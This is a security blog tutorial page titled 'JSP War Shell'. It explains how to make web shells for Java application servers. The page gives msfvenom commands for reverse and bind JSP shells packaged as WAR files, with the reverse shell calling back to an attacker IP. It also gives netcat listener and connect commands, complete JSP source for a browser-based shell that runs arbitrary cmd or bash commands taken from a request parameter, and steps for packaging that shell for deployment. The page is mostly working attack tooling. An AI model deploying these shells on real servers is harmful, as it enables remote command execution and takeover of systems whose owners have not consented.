<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="JSP War Shell" /><meta property="og:locale" content="en_US" /><meta name="description" content="How to generate a reverse, bind, and in-browser JSP War shell. This will cover generating payloads with MSFVenom and manually creating a war file from our own JSP file(s)." /><meta property="og:description" content="How to generate a reverse, bind, and in-browser JSP War shell. This will cover generating payloads with MSFVenom and manually creating a war file from our own JSP file(s)." /><link rel="canonical" href="https://node-security.com/posts/jsp-war-shell/" /><meta property="og:url" content="https://node-security.com/posts/jsp-war-shell/" /><meta property="og:site_name" content="Node Security" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-10-25T20:09:48+11:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="JSP War Shell" /><meta name="twitter:site" content="@twitter_username" /><meta name="google-site-verification" content="zCs6F-1y95azrfcOnbFvS60JAILGGXaeG4vY1-JFacs" /> <script type="application/ld+json"> {"url":"https://node-security.com/posts/jsp-war-shell/","@type":"BlogPosting","headline":"JSP War Shell","dateModified":"2021-10-25T20:09:48+11:00","datePublished":"2021-10-25T20:09:48+11:00","description":"How to generate a reverse, bind, and in-browser JSP War shell. This will cover generating payloads with MSFVenom and manually creating a war file from our own JSP file(s).","mainEntityOfPage":{"@type":"WebPage","@id":"https://node-security.com/posts/jsp-war-shell/"},"@context":"https://schema.org"}</script><title>JSP War Shell | Node Security</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Node Security"><meta name="application-name" content="Node Security"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="preload" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"> <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"> <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"></noscript> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/icon.webp" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Node Security</a></div><div class="site-subtitle font-italic">Security & Programming Guides</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tools/" class="nav-link"> <i class="fa-fw fas fa-tools ml-xl-3 mr-xl-3 unloaded"></i> <span>TOOLS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/O1dMate" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['o1dmate','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>JSP War Shell</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>JSP War Shell</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Alexander Wells </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Oct 25, 2021, 8:09 PM +1100" >Oct 25<i class="unloaded">2021-10-25T20:09:48+11:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="869 words">4 min read</span></div></div><div class="post-content"><p>How to generate a reverse, bind, and in-browser JSP War shell. This will cover generating payloads with MSFVenom and manually creating a war file from our own JSP file(s).</p><ol><li><a href="#jsp-war-shell-msfvenom">JSP War Shell MSFVenom</a><ul><li><a href="#jsp-war-reverse-shell">JSP War Reverse Shell</a><li><a href="#jsp-war-bind-shell">JSP War Bind Shell</a><li><a href="#dealing-with-errors">Dealing with Errors</a></ul><li><a href="#jsp-war-simple-browser-shell">JSP War Simple Browser Shell</a><ul><li><a href="#example-shell-running-on-windows">Example Shell Running on Windows</a><li><a href="#example-shell-running-on-linux">Example Shell Running on Linux</a><li><a href="#package-with-java">Package with Java</a><li><a href="#package-manually">Package Manually</a></ul></ol><h1 id="jsp-war-shell-msfvenom">JSP War Shell MSFVenom</h1><p>Using the <code class="language-plaintext highlighter-rouge">msfvenom</code> tool built into Kali, we can see what shells we have available:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>root@kali:~# msfvenom --list payloads | grep jsp
    java/jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell
root@kali:~# 
</pre></table></code></div></div><p>We can check what settings need to be specified using:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>msfvenom -p java/jsp_shell_bind_tcp --list-options
msfvenom -p java/jsp_shell_reverse_tcp --list-options
</pre></table></code></div></div><h2 id="jsp-war-reverse-shell">JSP War Reverse Shell</h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.123 LPORT=3155 -f war &gt; shell.war
</pre></table></code></div></div><p>A netcat listener can be setup to listen for the connection using:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc -nvlp 3155
</pre></table></code></div></div><h2 id="jsp-war-bind-shell">JSP War Bind Shell</h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom -p java/jsp_shell_bind_tcp RHOST=0.0.0.0 LPORT=3155 -f war &gt; bind.war
</pre></table></code></div></div><p>We can then use netcat to connect to the bind shell:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc -nv 192.168.0.123 3155
</pre></table></code></div></div><h2 id="dealing-with-errors">Dealing with Errors</h2><p>The above two shells are designed to working with Windows and Linux servers. However, sometimes the following message can come up after trying to load the application:</p><p><img data-proofer-ignore data-src="/assets/security/jsp/jsp-3.png" alt="" /></p><p>This can be resolved by unzipping the war file, removing the System call, and replacing the OS check with correct shell path:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>String ShellPath = new String("cmd.exe");
</pre></table></code></div></div><p><br /></p><h1 id="jsp-war-simple-browser-shell">JSP War Simple Browser Shell</h1><p>Apologies for the below code highlight, apparently the code highlighter doesn’t like JSP code.</p><div class="language-jsp highlighter-rouge"><div class="code-header"> <span text-data=" Jsp "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
</pre><td class="rouge-code"><pre><span class="nt">&lt;body</span> <span class="na">style=</span><span class="s">"background: rgb(30,30,30);"</span><span class="nt">&gt;</span>

<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"GET"</span> <span class="na">action=</span><span class="s">"index.jsp"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;h4</span> <span class="na">style=</span><span class="s">"color: white;"</span><span class="nt">&gt;</span>Command Options<span class="nt">&lt;/h4&gt;</span>

   <span class="nt">&lt;select</span> <span class="na">id=</span><span class="s">"osType"</span> <span class="na">name=</span><span class="s">"osType"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"win"</span><span class="nt">&gt;</span>Windows<span class="nt">&lt;/option&gt;</span>
      <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"linux"</span><span class="nt">&gt;</span>Linux<span class="nt">&lt;/option&gt;</span>
   <span class="nt">&lt;/select&gt;</span>

   <span class="nt">&lt;/br&gt;</span>
   <span class="nt">&lt;/br&gt;</span>

   <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"cmd"</span> <span class="na">name=</span><span class="s">"cmd"</span> <span class="na">type=</span><span class="s">text</span> <span class="na">autofocus</span> <span class="na">style=</span><span class="s">"width: 300px;"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">submit</span> <span class="na">value=</span><span class="s">"Run Command"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>

<span class="nt">&lt;%@ page </span><span class="na">import=</span><span class="s">"java.io.*"</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;%!</span>
   <span class="c1">// Not Perfect, but will be good enough for a majority of cases that will arise</span>
   <span class="kd">public</span> <span class="nc">String</span> <span class="nf">HtmlEncode</span><span class="o">(</span><span class="nc">String</span> <span class="n">inputVal</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">return</span> <span class="n">inputVal</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"&amp;"</span><span class="o">,</span> <span class="s">"&amp;amp;"</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"&lt;"</span><span class="o">,</span> <span class="s">"&amp;lt;"</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="err">"&gt;</span><span class="s">", "</span><span class="o">&amp;</span><span class="n">gt</span><span class="o">;</span><span class="s">").replaceAll("</span><span class="err">\'</span><span class="s">", "</span><span class="o">&amp;</span><span class="n">apos</span><span class="o">;</span><span class="s">").replaceAll("</span><span class="err">\</span><span class="s">""</span><span class="o">,</span> <span class="s">"&amp;quot;"</span><span class="o">);</span>
   <span class="o">}</span>

   <span class="kd">public</span> <span class="nc">String</span> <span class="nf">RunCommand</span><span class="o">(</span><span class="nc">String</span> <span class="n">commandToRun</span><span class="o">,</span> <span class="nc">String</span> <span class="n">osType</span><span class="o">)</span> <span class="o">{</span>
      <span class="nc">String</span> <span class="n">outputString</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
      <span class="nc">String</span> <span class="n">currentLine</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

      <span class="k">try</span> <span class="o">{</span>
         <span class="nc">ProcessBuilder</span> <span class="n">processBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ProcessBuilder</span><span class="o">();</span>

         <span class="k">if</span> <span class="o">(</span><span class="n">osType</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"win"</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">processBuilder</span><span class="o">.</span><span class="na">command</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">,</span> <span class="s">"/c"</span><span class="o">,</span> <span class="n">commandToRun</span><span class="o">);</span>
         <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">processBuilder</span><span class="o">.</span><span class="na">command</span><span class="o">(</span><span class="s">"bash"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="n">commandToRun</span><span class="o">);</span>
         <span class="o">}</span>
         
         <span class="nc">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">processBuilder</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>

         <span class="nc">BufferedReader</span> <span class="n">sI</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>

         <span class="k">while</span><span class="o">((</span><span class="n">currentLine</span> <span class="o">=</span> <span class="n">sI</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">outputString</span> <span class="o">+=</span> <span class="nc">HtmlEncode</span><span class="o">(</span><span class="n">currentLine</span><span class="o">)</span> <span class="o">+</span> <span class="err">"</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="s">";
         }
      } catch(IOException e) {
         outputString = "</span><span class="nl">ERROR:</span> <span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="s">" + e.getCause() + "</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="s">" + e.getMessage() + "</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;"</span><span class="o">;</span>
      <span class="o">}</span>
      

      <span class="k">return</span> <span class="n">outputString</span><span class="o">;</span>
   <span class="o">}</span>
<span class="nt">%&gt;</span>
<span class="nt">&lt;%</span>
   <span class="nc">String</span> <span class="n">osType</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"osType"</span><span class="o">);</span>
   <span class="nc">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>
   <span class="nc">String</span> <span class="n">output</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>

   <span class="nc">String</span> <span class="n">htmlCmd</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
   <span class="nc">String</span> <span class="n">htmlOsType</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>

   <span class="k">if</span> <span class="o">(</span><span class="n">osType</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="o">(!</span><span class="n">osType</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"win"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">osType</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"linux"</span><span class="o">)))</span> <span class="o">{</span>
      <span class="n">osType</span> <span class="o">=</span> <span class="s">"linux"</span><span class="o">;</span>
   <span class="o">}</span>

   <span class="k">if</span><span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
      <span class="nc">String</span> <span class="n">line</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

      <span class="nc">String</span> <span class="n">testCommand</span> <span class="o">=</span> <span class="nc">RunCommand</span><span class="o">(</span><span class="s">""</span><span class="o">,</span> <span class="n">osType</span><span class="o">);</span>

      <span class="k">if</span> <span class="o">(</span><span class="n">testCommand</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"ERROR:"</span><span class="o">))</span> <span class="o">{</span>
         <span class="n">output</span> <span class="o">=</span> <span class="nc">RunCommand</span><span class="o">(</span><span class="n">cmd</span><span class="o">,</span> <span class="n">osType</span><span class="o">);</span>
      <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
         <span class="k">if</span> <span class="o">(</span><span class="n">osType</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"win"</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">output</span> <span class="o">=</span> <span class="s">"&lt;b style=\"color: white;\"</span><span class="err">&gt;</span><span class="s">" + HtmlEncode(RunCommand("</span><span class="n">cd</span><span class="s">", osType).trim().replaceAll("</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">r</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">n</span><span class="s">", "")) + HtmlEncode("</span><span class="err">&gt;</span> <span class="s">") + HtmlEncode(cmd) + "</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="o">&lt;/</span><span class="n">b</span><span class="err">&gt;</span><span class="s">";
         } else {
            String username = HtmlEncode(RunCommand("</span><span class="n">whoami</span><span class="s">", osType).trim().replaceAll("</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">r</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">n</span><span class="s">", ""));
            String hostname = HtmlEncode(RunCommand("</span><span class="n">hostname</span><span class="s">", osType).trim().replaceAll("</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">r</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">n</span><span class="s">", ""));
            String workingDir = HtmlEncode(RunCommand("</span><span class="n">pwd</span><span class="s">", osType).trim().replaceAll("</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">r</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">n</span><span class="s">", ""));

            String userAndHost = "</span><span class="o">&lt;</span><span class="n">b</span> <span class="n">style</span><span class="o">=</span><span class="err">\</span><span class="s">"color: rgb(136,223,51);\"</span><span class="err">&gt;</span><span class="s">" + username + "</span><span class="err">@</span><span class="s">" + hostname + "</span><span class="o">&lt;/</span><span class="n">b</span><span class="err">&gt;</span><span class="s">" + "</span><span class="o">&lt;</span><span class="n">span</span> <span class="n">style</span><span class="o">=</span><span class="err">\</span><span class="s">"color: white;\"</span><span class="err">&gt;</span><span class="o">:&lt;/</span><span class="n">span</span><span class="err">&gt;</span><span class="s">";
            String dirPath = "</span><span class="o">&lt;</span><span class="n">span</span> <span class="n">style</span><span class="o">=</span><span class="err">\</span><span class="s">"color: rgb(114,159,207);\"</span><span class="err">&gt;</span><span class="s">" + workingDir + "</span><span class="o">&lt;/</span><span class="n">span</span><span class="err">&gt;</span><span class="s">";

            output = userAndHost + dirPath + "</span><span class="o">&lt;</span><span class="n">span</span> <span class="n">style</span><span class="o">=</span><span class="err">\</span><span class="s">"color: white;\"</span><span class="err">&gt;#</span> <span class="s">" + HtmlEncode(cmd) + "</span><span class="o">&lt;/</span><span class="n">span</span><span class="err">&gt;</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;"</span><span class="o">;</span>
         <span class="o">}</span>

         <span class="n">output</span> <span class="o">+=</span> <span class="nc">RunCommand</span><span class="o">(</span><span class="n">cmd</span><span class="o">,</span> <span class="n">osType</span><span class="o">);</span>
      <span class="o">}</span>

      <span class="n">htmlCmd</span> <span class="o">=</span> <span class="nc">HtmlEncode</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
      <span class="n">htmlOsType</span> <span class="o">=</span> <span class="nc">HtmlEncode</span><span class="o">(</span><span class="n">osType</span><span class="o">);</span>
   <span class="o">}</span>
<span class="nt">%&gt;</span>
<span class="nt">&lt;pre</span> <span class="na">style=</span><span class="s">"color: white;"</span><span class="nt">&gt;&lt;%=</span><span class="n">output</span> <span class="nt">%&gt;&lt;/pre&gt;</span>

<span class="nt">&lt;script&gt;</span>
   <span class="kd">let</span> <span class="nx">cmdValue</span> <span class="o">=</span> <span class="dl">"</span><span class="nt">&lt;%=</span><span class="n">htmlCmd</span> <span class="nt">%&gt;</span><span class="dl">"</span><span class="p">.</span><span class="nx">replaceAll</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;quot;</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\"</span><span class="dl">"</span><span class="p">).</span><span class="nx">replaceAll</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;apos;</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">'</span><span class="dl">"</span><span class="p">).</span><span class="nx">replaceAll</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;gt;</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">&gt;</span><span class="dl">"</span><span class="p">).</span><span class="nx">replaceAll</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;lt;</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">&lt;</span><span class="dl">"</span><span class="p">).</span><span class="nx">replaceAll</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;amp;</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">&amp;</span><span class="dl">"</span><span class="p">);</span>
   <span class="kd">let</span> <span class="nx">osTypeValue</span> <span class="o">=</span> <span class="dl">"</span><span class="nt">&lt;%=</span><span class="n">htmlOsType</span> <span class="nt">%&gt;</span><span class="dl">"</span><span class="p">;</span>
   
   <span class="k">if</span> <span class="p">(</span><span class="nx">osTypeValue</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">win</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="nx">osTypeValue</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">linux</span><span class="dl">'</span><span class="p">)</span> <span class="nx">osTypeValue</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">linux</span><span class="dl">'</span><span class="p">;</span>

   <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">cmd</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">cmdValue</span><span class="p">;</span>
   <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">osType</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">osTypeValue</span><span class="p">;</span>
<span class="nt">&lt;/script&gt;</span>

<span class="nt">&lt;/body&gt;</span>
</pre></table></code></div></div><h2 id="example-shell-running-on-windows">Example Shell Running on Windows</h2><p><img data-proofer-ignore data-src="/assets/security/jsp/jsp-1.png" alt="" /></p><h2 id="example-shell-running-on-linux">Example Shell Running on Linux</h2><p><img data-proofer-ignore data-src="/assets/security/jsp/jsp-2.png" alt="" /></p><h2 id="package-with-java">Package with Java</h2><p>With the above JSP code, we can bundle it into a war file using the <code class="language-plaintext highlighter-rouge">jar</code> tool that comes with Java JDK:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>jar -cvf OUTPUT_FILE INPUT_FILES
jar -cvf browser-shell.war index.jsp
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">index.jsp</code> can also be substituted with <code class="language-plaintext highlighter-rouge">*</code> to bundle all the files in the current folder.</ul><h2 id="package-manually">Package Manually</h2><p>Alternatively, you can create a folder called <code class="language-plaintext highlighter-rouge">META-INF</code>, and inside that folder created a file called <code class="language-plaintext highlighter-rouge">MANIFEST.MF</code>. This file should contain the manifest version and Java version:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>Manifest-Version: 1.0
Created-By: 17.0.1 (Oracle Corporation)
</pre></table></code></div></div><p>We then create a zip file with the <code class="language-plaintext highlighter-rouge">index.jsp</code> file and the <code class="language-plaintext highlighter-rouge">META-INF</code> folder using a tool like 7zip. The output file should be renamed so it has the <code class="language-plaintext highlighter-rouge">.war</code> extension. The contents of the war file should look like this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>(FILE)     index.jsp
(FOLDER)   META-INF
(FILE)        MANIFEST.MF
